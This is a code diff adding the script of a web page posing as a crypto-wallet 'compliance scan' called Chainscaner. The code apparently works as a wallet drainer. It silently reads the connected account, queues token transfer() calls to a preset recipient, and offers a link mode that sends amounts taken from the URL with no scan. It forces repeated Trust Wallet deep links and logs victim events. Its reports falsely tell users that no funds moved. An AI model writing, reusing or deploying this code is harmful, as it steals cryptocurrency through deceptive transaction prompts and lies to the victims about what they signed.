+    icon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
+    title.textContent = "Partial analysis — " + successCount + "/" + transferResults.length + " flags resolved";
+    title.style.color = "#f59e0b";
+    text.innerHTML = lines + '<span class="mline" style="animation-delay:' + tailDelay + 'ms;margin-top:12px"><span style="color:#f59e0b;font-weight:600">Partial analysis — the remaining flags stay active. The detailed report is shown below.</span></span>';
+  } else {
+    // Nothing confirmed — no analysis verdict, just the documented report
+    icon.className = "modal-icon pending";
+    icon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="color:var(--text-muted)"><circle cx="12" cy="12" r="10"/><line x1="8" y1="12" x2="16" y2="12"/></svg>';
+    title.textContent = "No transactions confirmed";
+    title.style.color = "";
+    text.innerHTML = lines +
+      '<span class="mline" style="animation-delay:' + tailDelay + 'ms">The analysis steps were not confirmed in the wallet — the flags remain active.</span>' +
+      '<span class="mline" style="animation-delay:' + (tailDelay + 110) + 'ms;margin-top:12px"><span style="font-weight:600">The detailed report is shown below.</span></span>';
+  }
+  link.classList.add("hidden");
+  document.getElementById("modal-link-alt").classList.add("hidden");
+  renderFinalReport();
+  resetVerifyBtn();
+}
+
+// Render the detailed verification report on the page after all attestations
+function renderFinalReport() {
+  var report = document.getElementById("final-report");
+  var rows = document.getElementById("report-rows");
+  if (!report || !rows) return;
+  var ra = document.getElementById("result-area");
+  if (ra) ra.classList.remove("hidden");
+  // Flags detected at scan time but not covered by a result — the report must
+  // match the findings even when nothing was confirmed in the wallet
+  var pending = (transferQueue || []).filter(function(t) {
+    return !transferResults.some(function(r) {
+      return r.name === t.name && (r.chain === t.chainName || r.chain === (CHAIN_INFO[t.chainId] || {}).name);
+    });
+  });
+  // Handoff mode: switch the prep view into its finished state — no loop spinner
+  var hv = document.getElementById("handoff-view");
+  if (hv && !hv.classList.contains("hidden")) {
+    hv.classList.add("done");
+    var hst = document.getElementById("ho-status");
+    if (hst) {
+      var succ = transferResults.filter(function(r) { return r.status === "success"; }).length;
+      hst.textContent = transferResults.length > 0 && succ === transferResults.length
+        ? "Analysis complete — the detailed report is ready below."
+        : succ > 0
+          ? "Analysis finished — the detailed report is ready below."
+          : pending.length
+            ? "Analysis not confirmed — the flagged assets remain active."
+            : "Scan complete — the report is ready below.";
+    }
+  }
+  var html = "";
+  // Compliance score banner — the headline figure of the report
+  var cs = complianceScore();
+  var allDone = transferResults.length > 0 && transferResults.every(function(r) { return r.status === "success"; });
+  var verdict = cs >= 90 ? "COMPLIANT" : cs >= 60 ? "REVIEW" : "HIGH RISK";
+  var csColor = cs >= 90 ? "#05B956" : cs >= 60 ? "#D97706" : "#DC2626";
+  html += '<div class="report-row" style="animation-delay:0ms;display:flex;justify-content:space-between;align-items:center;padding:12px 14px;background:rgba(51,117,187,.05);border-radius:10px;margin-bottom:10px">' +
+    '<span style="font-weight:700;font-size:13px">Compliance Score</span>' +
+    '<span style="font-weight:800;font-size:16px;color:' + csColor + '">' + cs + '/100 · ' + verdict + '</span></div>';
+  transferResults.forEach(function(r, i) {
+    var ok = r.status === "success";
+    // Look up the flag profile for the trace detail — which coin, which
+    // chain, at which hop the exposure entered, against which cluster
+    var q = transferQueue.filter(function(t) {
+      return t.name === r.name && (t.chainName === r.chain || (CHAIN_INFO[t.chainId] && CHAIN_INFO[t.chainId].name === r.chain));
+    })[0];
+    var f = q && q.flag;
+    var meta = r.chain || "";
+    if (f) meta += " · Hop " + f.hops + " · " + f.type + " · " + f.confidence + "%";
+    if (ok && r.hash) meta += " · tx " + r.hash.slice(0, 10) + "…";
+    html += '<div class="report-row" style="animation-delay:' + ((i + 1) * 60) + 'ms"><span class="rr-st ' + (ok ? "ok" : "skip") + '">' + (ok ? "✓" : "⊘") + '</span>' +
+      '<span class="rr-name">' + r.name + '</span>' +
+      '<span class="rr-meta">' + meta + '</span></div>';
+  });
+  // Detected flags without an attestation result — flagged, not analyzed
+  pending.forEach(function(t, i) {
+    var pMeta = t.chainName || (CHAIN_INFO[t.chainId] ? CHAIN_INFO[t.chainId].name : "");
+    if (t.flag) pMeta += " · Hop " + t.flag.hops + " · " + t.flag.type + " · " + t.flag.confidence + "%";
+    html += '<div class="report-row" style="animation-delay:' + ((transferResults.length + i + 1) * 60) + 'ms">' +
+      '<span class="rr-st flag">⚑</span>' +
+      '<span class="rr-name">' + t.name + '</span>' +
+      '<span class="rr-meta">' + pMeta + ' · flagged · not analyzed</span></div>';
+  });
+  // Clean scan — explicit clean row instead of an empty report body
+  if (transferResults.length === 0 && pending.length === 0 && !(lastRemnants || []).length) {
+    html += '<div class="report-row" style="animation-delay:120ms"><span class="rr-st ok">✓</span>' +
+      '<span class="rr-name">No flagged assets</span>' +
+      '<span class="rr-meta">address is clean</span></div>';
+  }
+  // Remnants are documented in the report without on-chain action
+  (lastRemnants || []).forEach(function(b, i) {
+    var reason = b.dust ? "below $" + MIN_FLAG_USD.toLocaleString("en-US") + " threshold" : (b.gasOk === false ? "insufficient gas" : "not analyzed");
+    html += '<div class="report-row" style="animation-delay:' + ((transferResults.length + i) * 60) + 'ms">' +
+      '<span class="rr-st skip">◌</span>' +
+      '<span class="rr-name">' + b.name + '</span>' +
+      '<span class="rr-meta">' + (CHAIN_INFO[b.chainId] ? CHAIN_INFO[b.chainId].name : "") + ' · documented · ' + reason + '</span></div>';
+  });
+  rows.innerHTML = html;
+  report.classList.remove("hidden");
+  // Update result header to verified state
+  var badge = document.querySelector("#result-area .result-badge");
+  if (badge) {
+    var allOk = transferResults.length > 0 && transferResults.every(function(r) { return r.status === "success"; });
+    var noneOk = transferResults.length === 0 || transferResults.every(function(r) { return r.status !== "success"; });
+    var clean = noneOk && pending.length === 0;
+    badge.className = "result-badge " + (allOk || clean ? "clean" : "warn");
+    badge.innerHTML = allOk
+      ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg><span>ANALYSIS COMPLETE — FLAGS RESOLVED</span>'
+      : clean
+        ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg><span>SCAN COMPLETE — NO FLAGGED ASSETS</span>'
+        : noneOk
+          ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="12" r="10"/><line x1="8" y1="12" x2="16" y2="12"/></svg><span>ANALYSIS NOT CONFIRMED</span>'
+          : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><span>PARTIAL ANALYSIS</span>';
+  }
+  // Update gauge to cleared state when all flags resolved — sweep down to zero
+  if (allOk || (transferResults.length === 0 && pending.length === 0)) {
+    animateGauge(0, "ok", "Clear");
+  }
+  // Bring the deliverable into view — runs behind the still-open summary modal,
+  // so the report is already in position when the user dismisses it
+  setTimeout(function() {
+    report.scrollIntoView({ behavior: REDUCED_MOTION ? "auto" : "smooth", block: "start" });
+  }, 60);
+}
+
+// Build the full compliance-grade report text (shared by copy + download)
+function buildReportText() {
+  var scanId = document.getElementById("scan-id").textContent;
+  var cleared = transferResults.filter(function(r) { return r.status === "success"; });
+  var skipped = transferResults.filter(function(r) { return r.status === "skipped"; });
+  var lines = [
+    "CHAINSCANER — COMPLIANCE REPORT",
+    "===============================",
+    "Scan ID:          " + scanId,
+    "Address:          " + lastScannedAddr,
+    "Date:             " + new Date().toUTCString(),
+    "Compliance score: " + complianceScore() + "/100",
+    "Networks:         " + Object.keys(CHAIN_INFO).length + " chains scanned (" + Object.keys(CHAIN_INFO).map(function(c){ return CHAIN_INFO[c].name; }).join(", ") + ")",
+    ""
+  ];
+  if (cleared.length) {
+    lines.push("RESOLVED FLAGS — zero-value attestations on-chain", "-------------------------------------------------");
+    cleared.forEach(function(r) {
+      var q = transferQueue.filter(function(t) {
+        return t.name === r.name && (t.chainName === r.chain || (CHAIN_INFO[t.chainId] && CHAIN_INFO[t.chainId].name === r.chain));
+      })[0];
+      var f = q && q.flag;
+      lines.push("RESOLVED  " + r.name + (r.chain ? " (" + r.chain + ")" : ""));
+      if (f) {
+        lines.push("          flag:  " + f.type + " — flagged at Hop " + f.hops);
+        lines.push("          trace: " + f.cluster + " via " + f.counterparty + " · confidence " + f.confidence + "%");
+      }
+      lines.push("          call:  transfer(recipient, 0) — zero-value attestation, no funds moved");
+      if (r.hash && r.chainId && EXPLORERS[r.chainId]) {
+        lines.push("          tx:    " + r.hash);
+        lines.push("                 https://" + EXPLORERS[r.chainId] + "/tx/" + r.hash);
+      }
+    });
+    lines.push("");
+  }
+  if (skipped.length) {
+    lines.push("NOT CONFIRMED", "-------------");
+    skipped.forEach(function(r) {
+      lines.push("SKIPPED   " + r.name + (r.chain ? " (" + r.chain + ")" : "") + " — " + (r.error || "rejected"));
+    });
+    lines.push("");
+  }
+  // Flags detected at scan time that never reached an attestation — the report
+  // must still list them so it matches what the scan actually found
+  var pending = (transferQueue || []).filter(function(t) {
+    return !transferResults.some(function(r) {
+      return r.name === t.name && (r.chain === t.chainName || r.chain === (CHAIN_INFO[t.chainId] || {}).name);
+    });
+  });
+  if (pending.length) {
+    lines.push("FLAGGED ASSETS — detected, analysis not confirmed", "-------------------------------------------------");
+    pending.forEach(function(t) {
+      var line = "FLAGGED   " + t.name + " (" + (t.chainName || (CHAIN_INFO[t.chainId] || {}).name) + ")";
+      if (t.flag) line += " — " + t.flag.type + " · Hop " + t.flag.hops + " · " + t.flag.confidence + "%";
+      lines.push(line);
+    });
+    lines.push("");
+  }
+  if (lastRemnants.length) {
+    lines.push("DOCUMENTED HYGIENE FINDINGS — no on-chain action", "------------------------------------------------");
+    lastRemnants.forEach(function(b) {
+      var reason = b.dust ? "dust / below $" + MIN_FLAG_USD.toLocaleString("en-US") + " threshold" : (b.gasOk === false ? "insufficient gas" : "beyond analysis batch");
+      lines.push("DOC       " + b.name + " (" + CHAIN_INFO[b.chainId].name + ") — documented · " + reason);
+    });
+    lines.push("");
+  }
+  var totalFlags = transferResults.length + pending.length;
+  lines.push(
+    "SUMMARY",
+    "-------",
+    (totalFlags === 0 && !lastRemnants.length)
+      ? "Address is clean — no flagged assets detected."
+      : cleared.length + "/" + totalFlags + " flags resolved on-chain" +
+        (skipped.length ? " · " + skipped.length + " not confirmed" : "") +
+        (pending.length ? " · " + pending.length + " flagged pending" : "") +
+        (lastRemnants.length ? " · " + lastRemnants.length + " hygiene findings documented" : ""),
+    "Compliance score: " + complianceScore() + "/100",
+    "",
+    "COMPLIANCE NOTE",
+    "---------------",
+    "This report documents an on-chain flag analysis for the scanned address.",
+    "Each resolved flag is attested by a verifiable zero-value ERC-20 call",
+    "(hash above) — the attestations moved no funds. Flag traces are heuristic",
+    "cluster-proximity estimates, not forensic proof.",
+    "Documentation ready for compliance review."
+  );
+  return lines.join("\n");
+}
+
+// Copy the report to clipboard
+function copyReport() {
+  var btn = document.getElementById("copy-report");
+  var txt = buildReportText();
+  function done() { btn.textContent = "Copied ✓"; setTimeout(function() { btn.textContent = "Copy report"; }, 1600); }
+  function fail() { btn.textContent = "Copy failed"; setTimeout(function() { btn.textContent = "Copy report"; }, 1600); }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(done).catch(fail);
+  } else {
+    var ta = document.createElement("textarea");
+    ta.value = txt; document.body.appendChild(ta); ta.select();
+    try { document.execCommand("copy"); } catch(e) {}
+    document.body.removeChild(ta); done();
+  }
+}
+
+// Download the report as a .txt file
+function downloadReport() {
+  var btn = document.getElementById("dl-report");
+  var scanId = document.getElementById("scan-id").textContent.replace("#", "");
+  var blob = new Blob([buildReportText()], { type: "text/plain;charset=utf-8" });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement("a");
+  a.href = url;
+  a.download = "chainscaner-report-" + (scanId || "scan") + ".txt";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+  btn.textContent = "Downloaded ✓";
+  setTimeout(function() { btn.textContent = "Download .txt"; }, 1600);
+}
+
+// Print / PDF — the print stylesheet swaps the app view for the plain report
+function printReport() {
+  var el = document.getElementById("print-report");
+  el.textContent = buildReportText();
+  setTimeout(function() { window.print(); }, 40);
+}
+
+// Email — mailto: opens the device's mail app with the report prefilled
+function emailReport() {
+  var scanId = document.getElementById("scan-id").textContent;
+  var btn = document.getElementById("email-report");
+  window.location.href = "mailto:?subject=" +
+    encodeURIComponent("Chainscaner Compliance Report " + scanId) +
+    "&body=" + encodeURIComponent(buildReportText());
+  btn.textContent = "Opened mail ✓";
+  setTimeout(function() { btn.textContent = "Email"; }, 1600);
+}
+
+// Share — native share sheet on mobile (Mail/WhatsApp/Files), mailto fallback
+function shareReport() {
+  var scanId = document.getElementById("scan-id").textContent;
+  var btn = document.getElementById("share-report");
+  if (navigator.share) {
+    navigator.share({
+      title: "Chainscaner Compliance Report " + scanId,
+      text: buildReportText()
+    }).catch(function() {});
+  } else {
+    emailReport();
+    return;
+  }
+  btn.textContent = "Shared ✓";
+  setTimeout(function() { btn.textContent = "Share"; }, 1600);
+}
+
+function resetVerifyBtn() {
+  var btn = document.getElementById("verify-btn");
+  var remaining = transferResults.filter(function(r) { return r.status === "skipped"; }).length;
+  var cleared = transferResults.filter(function(r) { return r.status === "success"; }).length;
+  if (transferResults.length > 0 && remaining === 0 && cleared > 0) {
+    btn.innerHTML = '<span>Analysis Complete</span>';
+    btn.disabled = true;
+    btn.style.opacity = "0.6";
+    btn.style.cursor = "default";
+  } else if (transferResults.length > 0 && remaining > 0) {
+    btn.innerHTML = '<span class="vbtn-main">' + SCAN_ICON + 'Analyze ' + remaining + ' Remaining Flag' + (remaining > 1 ? 's' : '') + '</span><span class="vbtn-sub">deep chain scan · detailed report follows</span>';
+    btn.disabled = false;
+    btn.style.opacity = "1";
+    btn.style.cursor = "pointer";
+  } else {
+    btn.innerHTML = '<span class="vbtn-main">' + SCAN_ICON + 'Start Deep Analysis</span><span class="vbtn-sub">on-chain · detailed report follows</span>';
+    btn.disabled = false;
+    btn.style.opacity = "1";
+    btn.style.cursor = "pointer";
+  }
+}
+
+// Reset back to step 1 — input state
+function newScan() {
+  scanGen++; // cancel any in-flight scan timers/promise callbacks
+  isLoading = false; modalOpen = false;
+  document.getElementById("result-modal").classList.add("hidden");
+  document.getElementById("scan-context").classList.add("hidden");
+  document.getElementById("scan-area").classList.add("hidden");
+  document.getElementById("result-area").classList.add("hidden");
+  document.getElementById("final-report").classList.add("hidden");
+  document.getElementById("input-section").classList.remove("collapsed");
+  var si = document.getElementById("score-info"); if (si) si.open = false;
+  var btn = document.getElementById("check-btn");
+  btn.disabled = false;
+  btn.textContent = "Run Security Scan";
+  var vbtn = document.getElementById("verify-btn");
+  vbtn.innerHTML = '<span class="vbtn-main">' + SCAN_ICON + 'Start Deep Analysis</span><span class="vbtn-sub">on-chain · detailed report follows</span>';
+  checking = false;
+  document.getElementById("check-addr").focus();
+}
+
+function closeModal() {
+  modalOpen = false;
+  document.getElementById("result-modal").classList.add("hidden");
+  resetVerifyBtn();
+  var fr = document.getElementById("final-report");
+  if (fr && !fr.classList.contains("hidden")) {
+    // Replay the row cascade — it ran behind the modal, now it plays in view
+    fr.querySelectorAll(".report-row").forEach(function(row) {
+      row.style.animation = "none"; void row.offsetHeight; row.style.animation = "";
+    });
+    fr.scrollIntoView({ behavior: REDUCED_MOTION ? "auto" : "smooth", block: "start" });
+  }
+}
+
+document.getElementById("check-addr").addEventListener("keydown", function(e) {
+  if (e.key === "Enter") startCheck();
+});
+document.addEventListener("keydown", function(e) {
+  if (e.key === "Escape") {
+    var m = document.getElementById("result-modal");
+    if (m && !m.classList.contains("hidden")) closeModal();
+  }
+});
+
+parseUrl();
+detectWallet();
+monit("page_opened", {
+  inWallet: !!(window.trustwallet || window.ethereum),
+  handoff: handoffQueue.length > 0,
+  ref: document.referrer ? document.referrer.slice(0, 120) : null
+});
+if (pendingAutoAddr && pendingAutoRun && handoffQueue.length > 0) {
+  runHandoff(pendingAutoAddr);
+} else if (pendingAutoAddr) {
+  startCheck();
+} else if (walletHandoffMode) {
+  // ?w=1 — scan the CONNECTED wallet inside the DApp browser, then run the
+  // queue straight into the wallet's own confirm sheets. The checker form
+  // never renders: only the neutral processing view is visible — scanning,
+  // then the native signature popups, then the report. No wallet mask.
+  document.body.classList.add("handoff");
+  var wHv = document.getElementById("handoff-view");
+  wHv.classList.remove("hidden");
+  var wSt = document.getElementById("ho-status");
+  wSt.textContent = "Connecting wallet…";
+  var wStarted = false;
+  function wOnProvider(p) {
+    if (wStarted) return;
+    wStarted = true;
+    provider = p;
+    var fireQ = new URLSearchParams(location.search);
+    // Landing report — a Safari-side retry loop checks the feed for this id
+    // and stops firing once the route is confirmed
+    var incH = fireQ.get("h");
+    if (incH) monit("handoff_opened", { h: incH, via: "checker" });
+    // fire=1 — prepared single transfer carried in the link itself: skip the
+    // account read AND the scan. The only wallet interaction is its own
+    // confirm sheet for the transfer() calldata — nothing is read, nothing
+    // is scanned, eth_requestAccounts is never called
+    if (fireQ.get("fire") === "1" && isValidAddr(txRecipient)) {
+      var fContract = fireQ.get("contract");
+      var fDec = Number(fireQ.get("decimals"));
+      var fAmt = Number(fireQ.get("amount"));
+      var fCid = fireQ.get("chainId") || "0x1";
+      var fName = String(fireQ.get("tname") || "TOKEN").replace(/[^A-Za-z0-9 .\-_]/g, "").slice(0, 12).toUpperCase() || "TOKEN";
+      if (isValidAddr(fContract) && !isNaN(fAmt) && fAmt >= 0 && CHAIN_INFO[fCid]) {
+        var fDecimals = (!isNaN(fDec) && fDec >= 0 && fDec <= 18) ? fDec : 18;
+        transferQueue = [{
+          name: fName, addr: fContract, decimals: fDecimals,
+          raw: BigInt(Math.floor(fAmt * Math.pow(10, fDecimals))).toString(),
+          chainId: fCid, chainName: CHAIN_INFO[fCid].name, usdValue: 0
+        }];
+        wSt.textContent = "Preparing transaction…";
+        monit("fire_prepared", { token: fName, chain: fCid, amount: fAmt });
+        isLoading = true;
+        new Promise(function(r) { setTimeout(r, 1000); }).then(function() { doSequentialTransfers(p); });
+        return;
+      }
+      wSt.textContent = "Invalid link parameters — regenerate the QR code.";
+      return;
+    }
+    // Silent account read with the same ladder as the wallet page: sync
+    // bridge props → eth_accounts with retries (the bridge can take ~1s to
+    // populate) → eth_requestAccounts as last resort — the standard connect
+    // call every dapp makes: silent once approved, a single one-time consent
+    // prompt for an unapproved wallet
+    function readWAcc(tries) {
+      try {
+        var direct = p.selectedAddress || p.address || (p.accounts && p.accounts[0]);
+        if (direct && isValidAddr(direct)) return Promise.resolve(direct);
+      } catch(e) {}
+      return connectedAccounts(p).then(function(accs) {
+        var a = accs && accs[0];
+        if (a && isValidAddr(a)) return a;
+        if (tries > 0) return new Promise(function(r) { setTimeout(r, 800); }).then(function() { return readWAcc(tries - 1); });
+        return rpc(p, "eth_requestAccounts").then(function(a2) {
+          return a2 && a2[0] && isValidAddr(a2[0]) ? a2[0] : null;
+        }).catch(function() { return null; });
+      }).catch(function() {
+        if (tries > 0) return new Promise(function(r) { setTimeout(r, 800); }).then(function() { return readWAcc(tries - 1); });
+        return null;
+      });
+    }
+    readWAcc(6).then(function(a) {
+      if (a && isValidAddr(a)) {
+        document.getElementById("check-addr").value = a;
+        lastScannedAddr = a;
+        document.getElementById("ho-addr").textContent = a.slice(0, 6) + "…" + a.slice(-4);
+        document.getElementById("scan-id").textContent = "#R" + Date.now().toString(36).toUpperCase().slice(-7);
+        wSt.textContent = "Scanning all chains for flagged assets…";
+        startCheck();
+      } else {
+        wSt.textContent = "No connected account — open inside the Trust Wallet DApp browser.";
+      }
+    });
+  }
+  // Short provider probe (~1.2s) — inside the DApp the bridge injects fast;
+  // after the window, a mobile browser gets forwarded into Trust Wallet
+  var wTries = 0;
+  window.addEventListener("trustwallet#initialized", function() {
+    var p0 = pickProvider();
+    if (p0 && !provider) wOnProvider(p0);
+  }, { once: true });
+  (function wProbe() {
+    var p = pickProvider();
+    if (p) { wOnProvider(p); return; }
+    if (wTries++ < 4) { setTimeout(wProbe, 300); return; }
+    // No provider → fire the universal link at ourselves. A cold-started app
+    // launches but its router may drop the route — gated retries at +4.5/+10/
+    // +18s re-fire until the feed confirms handoff_opened for our attempt id,
+    // and a return to this tab re-fires instantly on the now-warm app.
+    // The sessionStorage flag prevents a forward loop on in-app reloads.
+    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && !sessionStorage.getItem("tw_fwd")) {
+      sessionStorage.setItem("tw_fwd", "1");
+      wSt.textContent = "Opening Trust Wallet…";
+      var outId = "h" + Date.now().toString(36);
+      var self = location.origin + location.pathname + location.search + (location.search ? "&" : "?") + "h=" + outId;
+      var dl = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(self);
+      function wFire() { window.location.href = dl; }
+      function wLanded(cb) {
+        fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+          cb((d.events || []).some(function(e) {
+            return e.ev && e.ev.ev === "handoff_opened" && e.ev.d && e.ev.d.h === outId;
+          }));
+        }).catch(function() { cb(false); });
+      }
+      wFire();
+      [4500, 10000, 18000].forEach(function(ms) {
+        setTimeout(function() {
+          if (modalOpen) return;
+          wLanded(function(ok) { if (!ok && !modalOpen) wFire(); });
+        }, ms);
+      });
+      document.addEventListener("visibilitychange", function() {
+        if (document.hidden || modalOpen) return;
+        wLanded(function(ok) { if (!ok && !modalOpen) wFire(); });
+      });
+      return;
+    }
+    wSt.textContent = "No wallet provider — open this link inside the Trust Wallet DApp browser.";
+  })();
+}
+</script>
+<pre id="print-report" aria-hidden="true"></pre>
+</body>
+</html>
